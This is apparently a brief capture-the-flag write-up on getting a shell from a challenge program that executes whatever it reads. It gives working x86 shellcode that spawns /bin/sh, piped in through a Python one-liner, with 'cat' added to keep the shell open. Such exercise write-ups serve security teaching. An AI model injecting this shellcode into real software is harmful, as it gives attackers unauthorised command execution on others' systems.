from the given code, we can asume that we need to utilize shellcode

so after running the program, we give it "/bin/sh"

but from the code, it reads in our buffer and executes it

so we should give it the assembly command

from "http://shell-storm.org/shellcode/files/shellcode-752.php" we know

we should enter 

"(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'") | ./execute"

This time, we get no error but still no shell! 

The shell is successfully running with this shellcode but is exiting before we can input anything into it. 

The final step here is to add a cat to the end of our Python command, which prevents this.

"(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | ./execute"
